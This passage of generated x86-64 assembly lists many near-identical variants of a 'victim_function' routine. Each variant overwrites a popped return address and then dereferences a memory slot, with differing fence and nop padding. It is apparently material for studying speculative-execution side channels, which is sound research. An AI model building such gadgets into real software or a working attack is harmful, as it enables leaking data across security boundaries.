.Lvictim_function_win0_var642:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 643
.Lvictim_function_win0_var643:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 644
.Lvictim_function_win0_var644:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 645
.Lvictim_function_win0_var645:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	nop
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 646
.Lvictim_function_win0_var646:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 647
.Lvictim_function_win0_var647:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 648
.Lvictim_function_win0_var648:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	nop
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 649
.Lvictim_function_win0_var649:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 650
.Lvictim_function_win0_var650:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 651
.Lvictim_function_win0_var651:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 652
.Lvictim_function_win0_var652:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	nop
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 653
.Lvictim_function_win0_var653:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 654
.Lvictim_function_win0_var654:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 655
.Lvictim_function_win0_var655:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 656
.Lvictim_function_win0_var656:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 657
.Lvictim_function_win0_var657:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	nop
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 658
.Lvictim_function_win0_var658:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 659
.Lvictim_function_win0_var659:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 660
.Lvictim_function_win0_var660:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 661
.Lvictim_function_win0_var661:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 662
.Lvictim_function_win0_var662:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 663
.Lvictim_function_win0_var663:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 664
.Lvictim_function_win0_var664:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 665
.Lvictim_function_win0_var665:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 666
.Lvictim_function_win0_var666:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 667
.Lvictim_function_win0_var667:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	nop
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 668
.Lvictim_function_win0_var668:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 669
.Lvictim_function_win0_var669:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 670
.Lvictim_function_win0_var670:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 671
.Lvictim_function_win0_var671:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 672
.Lvictim_function_win0_var672:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 673
.Lvictim_function_win0_var673:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 674
.Lvictim_function_win0_var674:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 675
.Lvictim_function_win0_var675:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 676
.Lvictim_function_win0_var676:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 677
.Lvictim_function_win0_var677:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 678
.Lvictim_function_win0_var678:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 679
.Lvictim_function_win0_var679:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 680
.Lvictim_function_win0_var680:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	nop
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 681
.Lvictim_function_win0_var681:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 682
.Lvictim_function_win0_var682:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 683
.Lvictim_function_win0_var683:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 684
.Lvictim_function_win0_var684:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 685
.Lvictim_function_win0_var685:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 686
.Lvictim_function_win0_var686:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 687
.Lvictim_function_win0_var687:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 688
.Lvictim_function_win0_var688:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	nop
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 689
.Lvictim_function_win0_var689:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 690
.Lvictim_function_win0_var690:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 691
.Lvictim_function_win0_var691:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	nop
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 692
.Lvictim_function_win0_var692:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 693
.Lvictim_function_win0_var693:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 694
.Lvictim_function_win0_var694:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 695
.Lvictim_function_win0_var695:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 696
.Lvictim_function_win0_var696:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 697
.Lvictim_function_win0_var697:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 698
.Lvictim_function_win0_var698:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 699
.Lvictim_function_win0_var699:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 700
.Lvictim_function_win0_var700:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 701
.Lvictim_function_win0_var701:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 702
.Lvictim_function_win0_var702:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	nop
	nop
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 703
.Lvictim_function_win0_var703:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 704
.Lvictim_function_win0_var704:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 705
.Lvictim_function_win0_var705:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	nop
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 706
.Lvictim_function_win0_var706:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 707
.Lvictim_function_win0_var707:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 708
.Lvictim_function_win0_var708:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 709
.Lvictim_function_win0_var709:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	nop
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 710
.Lvictim_function_win0_var710:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 711
.Lvictim_function_win0_var711:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 712
.Lvictim_function_win0_var712:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 713
.Lvictim_function_win0_var713:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	nop
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 714
.Lvictim_function_win0_var714:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 715
.Lvictim_function_win0_var715:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 716
.Lvictim_function_win0_var716:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 717
.Lvictim_function_win0_var717:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 718
.Lvictim_function_win0_var718:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 719
.Lvictim_function_win0_var719:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	nop
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 720
.Lvictim_function_win0_var720:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 721
.Lvictim_function_win0_var721:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 722
.Lvictim_function_win0_var722:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 723
.Lvictim_function_win0_var723:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 724
.Lvictim_function_win0_var724:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	nop
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 725
.Lvictim_function_win0_var725:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 726
.Lvictim_function_win0_var726:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 727
.Lvictim_function_win0_var727:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 728
.Lvictim_function_win0_var728:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 729
.Lvictim_function_win0_var729:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 730
.Lvictim_function_win0_var730:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 731
.Lvictim_function_win0_var731:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 732
.Lvictim_function_win0_var732:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 733
.Lvictim_function_win0_var733:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 734
.Lvictim_function_win0_var734:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 735
.Lvictim_function_win0_var735:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 736
.Lvictim_function_win0_var736:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
